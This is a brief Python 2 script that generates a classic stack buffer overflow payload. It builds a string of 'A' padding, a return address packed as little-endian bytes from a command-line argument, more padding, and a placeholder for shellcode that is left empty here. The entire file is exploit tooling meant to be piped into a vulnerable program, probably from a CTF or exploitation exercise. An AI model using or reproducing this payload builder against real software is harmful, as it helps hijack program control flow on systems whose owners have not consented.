# /usr/bin/env python
# encoding: utf-8

import sys


def adr_to_str16(add):
    a = hex(add + 0x1000000000000000)
    ret = chr(int(a[16:18], 16))
    ret += chr(int(a[14:16], 16))
    ret += chr(int(a[12:14], 16))
    ret += chr(int(a[10:12], 16))
    return ret


code = ""
code += ""

chaine = "\x41" * int(sys.argv[1])
chaine += adr_to_str16(int(sys.argv[2], 16))
chaine += "\x41" * int(sys.argv[3])
chaine += code
print chaine
